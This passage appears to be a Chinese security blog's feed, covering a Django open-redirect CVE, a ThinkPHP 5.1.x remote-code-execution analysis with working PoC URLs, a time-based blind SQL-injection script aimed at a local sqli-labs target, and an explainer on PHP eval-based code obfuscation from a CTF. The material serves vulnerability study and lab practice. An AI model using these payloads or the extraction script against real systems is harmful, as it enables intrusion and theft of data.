alt=""></p><p>site-packages/django/http/response.py 402<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4uq5b9669j30x30d0q4t.jpg" alt=""></p><p>可以看到产生了正常的301跳转</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>环境搭建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pip install django==2.0.7</span><br><span class="line"></span><br><span class="line">django-admin startproject project</span><br><span class="line"></span><br><span class="line">python manage.py runserver</span><br></pre></td></tr></table></figure><p>或者使用P牛的Vulhub<a href="https://github.com/vulhub/vulhub/tree/master/django/CVE-2018-14574" target="_blank" rel="noopener">CVE-2018-14574</a></p><p>访问<code>127.0.0.1//www.baidu.com</code>即可跳转到百度页面</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>在commend.py中的<code>get_full_path_with_slash</code>函数后新增了<code>escape_leading_slashes函数</code>对<code>\\</code>进行过滤</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4uqve1w87j30yo0kngoh.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4uqudhyh2j30qb09fwf8.jpg" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/17d8266bb265" target="_blank" rel="noopener">Django架构流程分析</a></p><p><a href="https://xz.aliyun.com/t/3302" target="_blank" rel="noopener">Django URL跳转漏洞分析（CVE-2018-14574 ）</a></p><p><a href="https://github.com/django/django/commit/6fffc3c6d420e44f4029d5643f38d00a39b08525#diff-1f8be0eae49a1bf37d52829eaeda6a4eR14" target="_blank" rel="noopener"> Fixed CVE-2018-14574</a></p>]]></content>
    
    <summary type="html">
    
      对于Django URL跳转漏洞（CVE-2018-14574 ）原理进行分析并复现
    
    </summary>
    
      <category term="漏洞分析" scheme="https://museljh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Python框架" scheme="https://museljh.github.io/tags/Python%E6%A1%86%E6%9E%B6/"/>
    
      <category term="CVE" scheme="https://museljh.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.1.x RCE分析</title>
    <link href="https://museljh.github.io/2019/07/06/ThinkPHP5.1.x%20RCE%E5%88%86%E6%9E%90/"/>
    <id>https://museljh.github.io/2019/07/06/ThinkPHP5.1.x RCE分析/</id>
    <published>2019-07-06T03:25:04.000Z</published>
    <updated>2020-02-19T08:51:49.727Z</updated>
    
    <content type="html"><![CDATA[<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>造成这个漏洞的主要原因为1.以反斜线\开始时直接将其作为类的命名空间路径。2.<code>thinkphp</code>命名空间自动加载类的特性。官方采的修复方式修复：对控制器的命名规则进行正则检测：</p><p><code>thinkphp/library/think/route/dispatch/Url.php</code> 63行 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    if ($controller &amp;&amp; !preg_match(&apos;/^[A-Za-z][\w|\.]*$/&apos;, $controller)) &#123;</span><br><span class="line">    throw new HttpException(404, &apos;controller not exists:&apos; . $controller);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞和分析"><a href="#漏洞和分析" class="headerlink" title="漏洞和分析"></a>漏洞和分析</h2><p>环境搭建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php.exe composer.phar create-project topthink/think=5.1.20 tp  --prefer-dist</span><br></pre></td></tr></table></figure><p><code>POC</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5.1.20/public/index.php?s=index/think\App/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/tp5.1.20/public/index.php?s=index/think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br></pre></td></tr></table></figure><p><code>thinkphp/library/think/APP.php</code> 402 路由检测 </p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4puw3mbygj30m703eq32.jpg" alt=""></p><p>F7进入 routeCheck()</p><p><code>thinkphp/library/think/APP.php</code> 598 获取应用调度信息<br><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4puxaauscj30px0bv75x.jpg" alt=""></p><p>进入path()</p><p><code>thinkphp/library/think/Request.php</code> 716</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pv1qrtefj314i0dtabu.jpg" alt=""></p><blockquote><p>在没有定义路由的情况下典型的URL访问规则（PATHINFO模式）是：<code>http://serverName/index.php（或者其它应用入口文件）/模块/控制器/操作/[参数名/参数值...]</code></p></blockquote><p>进入pathinfo()</p><p><code>thinkphp/library/think/Request.php</code> 680 根据不同的请求方式获取当前URL的pathinfo信息</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pv7xmxo9j30uw021jre.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pvajn8h9j30rb0dntaa.jpg" alt=""></p><p><code>thinkphp/library/think/APP.php</code> 604 对路由进行解析,返回一个dispatch对象</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pvdm04kdj30ye02iaa6.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pvrg4d1nj318a01q0sy.jpg" alt=""></p><p><code>thinkphp/library/think/route/dispath/URL.php</code> 23 解析默认的URL规则</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pvslwu9qj30rh06yt97.jpg" alt=""></p><p>进入parseUrl()</p><p><code>thinkphp/library/think/route/dispath/URL.php</code> 48</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pvwdfc1ej310c0g8acp.jpg" alt=""></p><p>进入parseUrlPath()</p><p><code>thinkphp/library/think/route/rule.php</code> 960 对path进行<code>/</code>分割，分割成模块/控制器/操作方法</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pw0m0hcbj313r0c6q4w.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pw5pv1alj31f40cm768.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwcv7h9ij31de059jrx.jpg" alt=""></p><p>进入init()</p><p><code>thinkphp/library/think/route/dispatch/Module.php</code> 37 多模块部署 满足该模块不是deny模块，且存在这个模块(index)，则将<code>$available = true;</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwi02r37j31fk0cwacx.jpg" alt=""></p><p><code>thinkphp/library/think/route/dispatch/Module.php</code> 58 模块初始化</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwkiysodj30wt05m0td.jpg" alt=""></p><p><code>thinkphp/library/think/APP.php</code> 406 对路由进行调度</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwq9zxzdj31d801umxc.jpg" alt=""></p><p><code>thinkphp/library/think/APP.php</code> 431</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pws5lvgmj31eb03dmxk.jpg" alt=""></p><p><code>thinkphp/library/think/APP.php</code> 431</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwu2u71hj31do03emxq.jpg" alt=""></p><p>进入add(),注册中间件</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwvqdj2kj312b07idgn.jpg" alt=""></p><p><code>thinkphp/library/think/APP.php</code> 435 调度中间件</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pwwmjgf5j30om02fmx6.jpg" alt=""></p><p>进入<code>dispath()</code></p><p>进入<code>resolve()</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4px85icz5j30nf084wgv.jpg" alt=""></p><p>就会调用之前<code>App</code>类中的闭包函数。这里会调用Dispatch类中的run()方法</p><p><code>thinkphp/library/think/route</code> 168<br><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4px1sq1hcj31c20f0jtg.jpg" alt=""></p><p>进入 <code>exec()</code></p><p><code>thinkphp/library/route/dispatch</code> 92 实例化控制类即<code>\think\container</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pxjhki6uj3191038q3g.jpg" alt=""></p><p>进入<code>controller()</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pxl5yidqj31dq08975x.jpg" alt=""></p><p>进入<code>parseModuleAndClass()</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pxongr3vj31i40d7q5l.jpg" alt=""></p><p>这里一旦控制器是以<code>\</code>开头则会直接将其作为类的命名空间路径，这也是导致这个漏洞的主要原因</p><p> 接着就会判断其是否存在并加载这个类，也就是<code>container</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pxrlsu9fj316x0590tl.jpg" alt=""></p><p>进入<code>make()</code></p><p><code>thinkphp/library/think/container.php</code> 278</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pxzrm17aj319a0chtah.jpg" alt=""></p><p>进入<code>invokeFunction()</code></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4py026abkj30y60fuq5a.jpg" alt=""></p><p>进行反射实例化</p><p>在<code>thinkphp/library/think/route/dispatch/Module.php</code> 132 利用反射机制调用类方法，从而进行代码执行</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQly1g4pyb5bmzmj30z402cdfw.jpg" alt=""></p><p>最终调用了<code>thinkphp/library/think/Container.php</code>，<code>call_user_func_array()</code>执行任意函数调用</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g4pyds6fmhj31dk098wfu.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      对于ThinkPHP5.1.x RCE原理分析
    
    </summary>
    
      <category term="漏洞分析" scheme="https://museljh.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="PHP框架" scheme="https://museljh.github.io/tags/PHP%E6%A1%86%E6%9E%B6/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://museljh.github.io/2019/05/30/mysql%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/"/>
    <id>https://museljh.github.io/2019/05/30/mysql注入小结/</id>
    <published>2019-05-30T11:42:07.903Z</published>
    <updated>2019-11-27T04:14:17.149Z</updated>
    
    <content type="html"><![CDATA[<p>盲注脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"> </span><br><span class="line">MAX_DBName_len = 100</span><br><span class="line">MAX_TableName_len = 100</span><br><span class="line">MAX_ColumnName_len = 100</span><br><span class="line">MAX_Data_len = 100</span><br><span class="line">MAX_Table_Num = 100</span><br><span class="line">MAX_Column_Num = 100</span><br><span class="line">MAX_Data_Num = 100</span><br><span class="line"> </span><br><span class="line">chars = &apos;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#123;&#125;_!@#$%^&amp;*()&apos;</span><br><span class="line">        </span><br><span class="line">target_url = &quot;http://192.168.119.135/sqli-labs/Less-9/?id=1&quot;      </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">def get_DBName_len():</span><br><span class="line">    print(&quot;Start to get DBName_len...&quot;)</span><br><span class="line">    DBName_len = 0</span><br><span class="line">    url_template = target_url + &quot;&apos; union select 1,2,if (length(database())=&#123;0&#125;,sleep(3),null) %2D%2D%20&quot;</span><br><span class="line">    </span><br><span class="line">    for i in range(0, MAX_DBName_len):</span><br><span class="line">        starttime = time.time()</span><br><span class="line">        url = url_template.format(i)</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        </span><br><span class="line">        if time.time()-starttime &gt; 3:</span><br><span class="line">            DBName_len = i;</span><br><span class="line">            print(&quot;DBName_len is: &quot;, DBName_len)</span><br><span class="line">            break;</span><br><span class="line">        </span><br><span class="line">    if DBName_len == 0:</span><br><span class="line">        if i == MAX_DBName_len - 1:</span><br><span class="line">            print(&quot;DBName_len &gt; MAX_DBName_len!&quot;)</span><br><span class="line">        print(&quot;Cannot get DB_len. Program ended.&quot;)</span><br><span class="line">        exit()</span><br><span class="line">    return DBName_len</span><br><span class="line"> </span><br><span class="line">def get_DBName(DBName_len):</span><br><span class="line">    print(&quot;Start to retrieve database name...&quot;)</span><br><span class="line">    DBName = &quot;&quot;</span><br><span class="line">    url_template = target_url + &quot;&apos; union select 1,2, if(ascii(substr(database(),&#123;0&#125;,1))=&#123;1&#125;,sleep(2),null) %2D%2D%20&quot;   </span><br><span class="line">    for i in range(1, DBName_len + 1):</span><br><span class="line">        tempDBName = DBName</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(i, char_ascii)</span><br><span class="line">            starttime = time.time()</span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            if time.time()-starttime &gt; 2:</span><br><span class="line">                DBName += char</span><br><span class="line">                break</span><br><span class="line">        if tempDBName == DBName:</span><br><span class="line">            print(&quot;Letters too little! Program ended.&quot;)</span><br><span class="line">            exit()</span><br><span class="line">    print(&quot;Retrieve completed! DBName is: &quot; + DBName)</span><br><span class="line">    return DBName</span><br><span class="line"> </span><br><span class="line">def get_TableNumOfDB(DBName):</span><br><span class="line">    print(&quot;Start to get TableNumOfDB...&quot;)</span><br><span class="line">    TableNumOfDB = 0</span><br><span class="line">    url_template = target_url + &quot;&apos; and if ((select count(table_name)a from information_schema.tables where table_schema = database() having a=&#123;0&#125;),sleep(2),true)  %2D%2D%20&quot;</span><br><span class="line">    for i in range(0, MAX_Table_Num):</span><br><span class="line">        url = url_template.format(i)</span><br><span class="line">        starttime = time.time()</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        if time.time()-starttime &gt; 2:</span><br><span class="line">            TableNumOfDB = i;</span><br><span class="line">            print(&quot;the number of table is:&quot; , TableNumOfDB)</span><br><span class="line">            break</span><br><span class="line">    if TableNumOfDB == 0:</span><br><span class="line">        if i == TableNumOfDB - 1:</span><br><span class="line">            print(&quot;table number of database &gt; MAX_TableName_len!&quot;)</span><br><span class="line">    return TableNumOfDB</span><br><span class="line"> </span><br><span class="line">def get_TableName_len(Table_num):</span><br><span class="line">    print(&quot;Start to get TableName_len...&quot;)</span><br><span class="line">    TableName_len = 0</span><br><span class="line">    url_template = target_url + &quot;&apos; and if (( (select length(table_name) from information_schema.tables where table_schema = database() limit &#123;0&#125;,1)=&#123;1&#125;),sleep(2),true)   %2D%2D%20&quot;</span><br><span class="line">    for i in range(0, MAX_TableName_len):</span><br><span class="line">        url = url_template.format(Table_num - 1, i)</span><br><span class="line">        starttime = time.time()</span><br><span class="line">        response = requests.get(url)</span><br><span class="line">        if time.time()-starttime &gt; 2:</span><br><span class="line">            TableName_len = i</span><br><span class="line">            break</span><br><span class="line">    if TableName_len == 0:</span><br><span class="line">        if i == MAX_TableName_len - 1:</span><br><span class="line">            print(&quot;TableName_len &gt; MAX_TableName_len!&quot;)</span><br><span class="line">    return TableName_len</span><br><span class="line"> </span><br><span class="line">def get_TableName(Table_num, TableName_len):</span><br><span class="line">    print(&quot;Start to get TableName...&quot;)</span><br><span class="line">    TableName = &quot;&quot;</span><br><span class="line">    url_template = target_url + &quot;&apos; and if ((ascii(substr((select table_name from information_schema.tables where table_schema = database() limit &#123;0&#125;,1),&#123;1&#125;,1))=&#123;2&#125;),sleep(2),true)  %2D%2D%20&quot;   </span><br><span class="line">    for i in range(1, TableName_len + 1):</span><br><span class="line">        tempTableName = TableName</span><br><span class="line">        for char in chars:</span><br><span class="line">            char_ascii = ord(char)</span><br><span class="line">            url = url_template.format(Table_num - 1, i, char_ascii)</span><br><span class="line">            starttime = time.time()</span><br><span class="line">            response = requests.get(url)</span><br><span class="line">            if time.time()-starttime &gt; 2:</span><br><span class="line">                TableName += char</span><br><span class="line">                break           </span><br><span class="line">        if tempTableName == TableName:</span><br><span class="line">            print(&quot;Letters too little! Program ended.&quot;)</span><br><span class="line">            exit()</span><br><span class="line">    print(&quot;Retrieve completed! TableName is: &quot; + TableName)</span><br><span class="line">    return TableName</span><br><span class="line"> </span><br><span class="line">#print(&quot;tables in &quot;+DBName+&quot;:&quot;)</span><br><span class="line">for i in range(0,4+1):</span><br><span class="line">    TableName_len = get_TableName_len(i)</span><br><span class="line">    TabName = get_TableName(i,TableName_len)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;盲注脚本&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP代码加密原理探索</title>
    <link href="https://museljh.github.io/2019/05/15/PHP%E4%BB%A3%E7%A0%81%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E6%8E%A2%E7%B4%A2/"/>
    <id>https://museljh.github.io/2019/05/15/PHP代码加密原理探索/</id>
    <published>2019-05-15T09:51:29.000Z</published>
    <updated>2019-05-15T10:09:36.305Z</updated>
    
    <content type="html"><![CDATA[<h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>以我理解解释下CISCN线上初赛一题非预期解法</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2xrm0cx2kj30m9020aa1.jpg" alt=""></p><p>先抛出来有扩展加密方式</p><p>此种加密原理是把源码通过des或aes等加密算法进行加密，当加密的源码执行时扩展会截获加密的代码并解密后交给zend执行。</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2xrr3i875j30fp048gmv.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $code = file_get_contents(&apos;待加密的PHP&apos;);</span><br><span class="line">  $code = base64_encode(openssl_encrypt($code, &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));</span><br><span class="line">  echo &quot;&lt;?php eval(openssl_decrypt(base64_decode($code), &apos;aes-128-cbc&apos;, &apos;密钥&apos;, false, &apos;IV&apos;));&quot;;</span><br></pre></td></tr></table></figure><p>将其化成流程图方式讲解。</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2xs0ctb2gj30vp0c5abn.jpg" alt=""></p><p>由于其中加密的密钥用户是可以自己修改的(以php-beast为例子)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static uint8_t key[] = &#123;</span><br><span class="line">    0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6,</span><br><span class="line">    0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>所以题目的流程图如下</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2ynnp7uxbj30qg0dedh8.jpg" alt=""></p><p>那么我们要怎么去解这题呢？</p><p>zsx学长发现了一个sdk.php文件是用SourceGuardian加密的。因此zsx学长先下载了一个SourceGuardian扩展，并且再引入了一个sg11的破解脚本密钥，<br>sg11目的是为了破解这个<code>openssl_private_encrypt</code>达到实现正真题目环境也就是SDK让它能够正常运行，然后再让它满足<code>sha1($key) === $this-&gt;getHash()</code>条件即可。</p><p>所以截图如下</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2ymsa5l2wj30ga09btay.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2xtlmd5k0j30no078jvw.jpg" alt=""></p><p>sg11的破解脚本这里起到的作用为<code>openssl_private_decrypt</code>，然后<br>直接修改<code>zend_is_identical</code>的返回值，直接让他return 1，使得<code>sha1($key) === $this-&gt;getHash()</code>条件成立满足sdk.php条件，直接var_dump出flag</p><blockquote><p><code>zend_is_identical</code>为控制===返回值</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2xtzpgcprj30pn0fhtg6.jpg" alt=""></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>目前编程语言可以分为两大类:</p><p>第一类是像C/C++， .NET， Java之类的编译型语言， 它们的共性是: 运行之前必须对源代码进行编译，然后运行编译后的目标文件。</p><p>第二类比如:PHP， Javascript， Ruby， Python这些解释型语言， 他们都无需经过编译即可”运行”，虽然可以理解为直接运行，</p><p>但它们并不是真的直接就被能被机器理解， 机器只能理解机器语言，那这些语言是怎么被执行的呢， 一般这些语言都需要一个解释器， 由解释器来执行这些源码， 实际上这些语言还是会经过编译环节， 只不过它们一般会在运行的时候实时进行编译。</p><p>为了效率，并不是所有语言在每次执行的时候都会重新编译一遍， 比如PHP的各种opcode缓存扩展(如APC， xcache， eAccelerator等)，比如Python会将编译的中间文件保存成pyc/pyo文件， 避免每次运行重新进行编译所带来的性能损失。</p><p>一种语言被称为编译类语言，一般是由于在程序执行之前有一个翻译的过程， 其中关键点是有一个形式上完全不同的等价程序生成。 而PHP之所以被称为解释类语言，就是因为并没有这样的一个程序生成， 它生成的是中间代码，这只是PHP的一种内部数据结构。</p><p>当一段PHP代码进入Zend虚拟机，它会被执行两步操作:编译和执行。 对于一个解释性语言来说，这是一个创造性的举动，但是，现在的实现并不彻底。 现在当PHP代码进入Zend虚拟机后，它虽然会被执行这两步操作，但是这两步操作对于一个常规的执行过程来说却是连续的， </p><p>也就是说它并没有转变成和Java这种编译型语言一样：生成一个中间文件存放编译后的结果。 如果每次执行这样的操作，对于PHP脚本的性能来说是一个极大的损失。 虽然有类似于APC，eAccelerator等缓存解决方案。但是其本质上是没有变化的，并且不能将两个步骤分离，各自发展壮大。</p><p>PHP语言作为脚本语言的一种，由于不需要进行编译，所以通常PHP程序的分发都是直接发布源代码。对于开源软件来说这并没有什么问题，但是对于一些商业代码却是一个不太好的消息，正因为如此，导致PHP界涌现出了不少加密产品。</p><h2 id="加密的本质"><a href="#加密的本质" class="headerlink" title="加密的本质"></a>加密的本质</h2><p>本质上程序在运行时都是在执行机器码，而基于虚拟机的语言的加密通常也是加密到这个级别， 也就是说PHP加密后的程序在执行之前都会解密成opcode来执行。</p><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2veeo2jphj30pj0evq4r.jpg" alt=""></p><p>PHP在执行之前有一个编译的环节，编译的结果是opcode，然后由Zend虚拟机执行， 从这里看如果只要将源代码加密，然后在执行之前将代码解密即可。</p><p>加密的目的就是为了防止轻易获取程序源码的一种手段，对于PHP来说， 将源码编译为opcode已经能达到目的了，因为PHP引擎最终都是需要执行opcode的。 虽然可以将加密进一步，但是如果需要修改Zend引擎，那么成本就有点大了，因为需要修改 Zend引擎了，而这是无法通过简单的扩展机制来实现了，所以解密的成本也会变的太大， 也就没有实际意义了。</p><blockquote><p>opcode是计算机指令中的一部分，用于指定要执行的操作， 指令的格式和规范由处理器的指令规范指定。<br>PHP中的opcode则属于前面介绍中的后者，PHP是构建在Zend虚拟机(Zend VM)之上的。PHP的opcode就是Zend虚拟机中的指令。</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/0078P6qQgy1g2vij9m6f0j30je05t3zf.jpg" alt=""></p><h2 id="PHP源码加密-解密的初步探索"><a href="#PHP源码加密-解密的初步探索" class="headerlink" title="PHP源码加密/解密的初步探索"></a>PHP源码加密/解密的初步探索</h2><h3 id="无扩展加密"><a href="#无扩展加密" class="headerlink" title="无扩展加密"></a>无扩展加密</h3><p>此种加密方式不依赖其他扩展，可以虽然看上去无法阅读，但是可以直接执行。<br>原理基本上就是以eval(*_decode(…))为核心辅以各种字符串混淆和小技巧。不外乎以下几类</p><p>1.采用多种编码 </p><p>base64_decode,urldecode,gzuncompress</p><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">eval(&quot;echo &apos;hello by museljh&apos;;&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a=base64_encode(&quot;echo &apos;hello by museljh&apos;;&quot;);</span><br><span class="line">eval(base64_decode($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function phpencode($code) &#123;</span><br><span class="line">$code = str_replace(array(&apos;&lt;?php&apos;,&apos;?&gt;&apos;,&apos;&lt;?PHP&apos;),array(&apos;&apos;,&apos;&apos;,&apos;&apos;),$code);</span><br><span class="line">$encode = base64_encode(gzdeflate($code));// 开始编码</span><br><span class="line">$encode = &apos;&lt;?php&apos;.&quot;\neval(gzinflate(base64_decode(&quot;.&quot;&apos;&quot;.$encode.&quot;&apos;&quot;.&quot;)));\n?&gt;&quot;;</span><br><span class="line">return $encode;</span><br><span class="line">&#125;</span><br><span class="line">function phpdecode($code) &#123;</span><br><span class="line">$code = str_replace(array(&apos;&lt;!?php&apos;,&apos;&lt;?PHP&apos;,&quot;eval(gzinflate(base64_decode(&apos;&quot;,&quot;&apos;)));&quot;,&apos;?&gt;&apos;),array(&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;,&apos;&apos;),$code);</span><br><span class="line">$decode = base64_decode($code);</span><br><span class="line">$decode = @gzinflate($decode);</span><br><span class="line">return $decode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a=&quot;echo &apos;hello by museljh&apos;;&quot;;</span><br><span class="line">echo phpencode($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight 